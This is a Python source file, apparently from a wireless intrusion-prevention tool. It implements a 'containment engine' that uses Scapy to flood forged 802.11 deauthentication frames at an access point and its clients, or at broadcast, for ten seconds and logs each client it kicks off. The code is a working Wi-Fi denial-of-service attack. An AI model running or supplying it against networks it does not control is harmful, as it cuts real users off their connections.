import os
import time
import config
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
from config import DEAUTH_COUNT, DEAUTH_INTERVAL

# 🔥 استيراد تسجيل الهجوم للـ UI
from ui.terminal_ui import log_attack, client_kicked

class ContainmentEngine:

    def __init__(self, iface):
        self.iface = iface

    def contain(self, bssid, clients, channel):

        if channel is None:
            print("[Containment] Channel unknown.")
            return

        print(f"[Containment] Locking on channel {channel}")

        config.LOCKED_CHANNEL = channel
        time.sleep(1)

        attack_duration = 10
        start_time = time.time()

        # 🔥 تسجيل بداية الهجوم
        log_attack(f"🚨 Containment started → {bssid}", bssid)

        while time.time() - start_time < attack_duration:

            if clients:

                for client in clients:

                    self.deauth_pair(bssid, client)

                    # 🔥 تسجيل طرد العميل
                    client_kicked()

                    log_attack(
                        f"📴 Client {client} kicked from {bssid}",
                        bssid
                    )

            else:
                # 🚀 Broadcast attack
                self.deauth_pair(bssid, "ff:ff:ff:ff:ff:ff")

                log_attack(
                    f"⚡ Broadcast Deauth → {bssid}",
                    bssid
                )

        config.LOCKED_CHANNEL = None

        log_attack(f"✅ Containment finished → {bssid}")

        print("[Containment] Attack finished.")

    def deauth_pair(self, bssid, client):

        pkt1 = RadioTap()/Dot11(
            addr1=client,
            addr2=bssid,
            addr3=bssid
        )/Dot11Deauth(reason=7)

        pkt2 = RadioTap()/Dot11(
            addr1=bssid,
            addr2=client,
            addr3=bssid
        )/Dot11Deauth(reason=7)

        sendp(
            pkt1,
            iface=self.iface,
            count=DEAUTH_COUNT,
            inter=DEAUTH_INTERVAL,
            verbose=False
        )

        sendp(
            pkt2,
            iface=self.iface,
            count=DEAUTH_COUNT,
            inter=DEAUTH_INTERVAL,
            verbose=False
        )

        # 🔥 تسجيل packet
        log_attack(f"⚡ Deauth sent {bssid} → {client}", bssid)